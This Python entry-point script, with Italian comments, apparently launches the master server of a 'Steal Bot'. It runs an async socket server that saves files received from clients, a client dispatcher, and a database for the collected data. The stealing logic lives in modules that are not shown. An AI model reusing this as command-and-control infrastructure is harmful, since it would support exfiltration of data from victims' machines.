"""
Esecuzione del bot master.

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
# Definizione dei moduli
import asyncio
import click
from functools import partial
from signal import SIGINT, SIGTERM
import os

# Import di funzioni di libreria personale
from utilities import bot_master_utility as bot_master
from utilities import async_socket_server as async_server
from utilities import database_handler as db

__dispatcher_buf_size = 150


def validator(hostname: str, port: int):
    """Inizializzazione degli handler (tastiera e porta in uso)."""
    if (bot_master.port_validator(hostname, port) is True):
        bot_master.info(f"Al momento la porta {port} è in utilizzo!! Uscita dal programma in corso!", 4)  # Log Level: Critical
    else:
        bot_master.info(f"Al momento la porta {port} è libera! Inizializzazione del server!", 2)


def main():
    """Funzione main eseguita all'avvio dello script."""
    bot_master.welcome_message("Steal Bot")


@click.command()
@click.option("--host", default='127.0.0.1', type=str, help="Host su cui deve essere esposto il service")
@click.option("--port", default=9090, type=int, help="Porta sulla quale deve mettersi in ascolto il service")
@click.option("--out_directory", default='result', type=str, help="Directory da utilizzare per il salvataggio dei file ricevuti dal client")
@click.option("--supervisor", default='server', type=str, help="Stato in base alla quale si attiverà il server o la gestione del database")
def start(host: str, port: int, out_directory: str, supervisor: str):
    """Funzione di esecuzione del server."""
    bot_master.info(f"Running master in {supervisor} mode", 1)

    match supervisor:
        case "server":
            validator(host, port)
            bot_master.initialize_result_folder(os.getcwd(), out_directory)
            loop = asyncio.new_event_loop()

            for signal_enum in [SIGINT, SIGTERM]:
                exit_func = partial(bot_master.immediate_exit, signal_enum=signal_enum, loop=loop)
                loop.add_signal_handler(signal_enum, exit_func)
            try:
                loop.run_until_complete(async_server.run_server(host, port))
            except bot_master.SignalHaltError as shr:
                print(f"{shr}")
                pass
            else:
                raise
        case "dispatcher":
            bot_master.bind_port_to_client(host, port, __dispatcher_buf_size)
            # dispatcher_loop = asyncio.new_event_loop()
            # for signal_enum in [SIGINT, SIGTERM]:
            #     exit_func = partial(bot_master.immediate_exit, signal_enum=signal_enum, loop=dispatcher_loop)
            #     dispatcher_loop.add_signal_handler(signal_enum, exit_func)
            # try:
            #     dispatcher_loop.run_until_complete(async_server.run_dispatcher(host, port))
            # except bot_master.SignalHaltError as shr:
            #     print(f"{shr}")
            #     pass
            # else:
            #     raise
        case "database":
            db.DatabaseHandler()  # Creazione automatica delle tabelle necessarie al salvataggio dei dati sul dbms


if __name__ == "__main__":
    main()
    """
    Di default verrà eseguito su localhost:9090. Per modificare il comportamento è possibile eseguire lo script con
                `python main.py --host='XXX.XXX.XXX.XXX' --port='XXXX --out_directory='result' --supervisor='server/database'`
    """
    start()
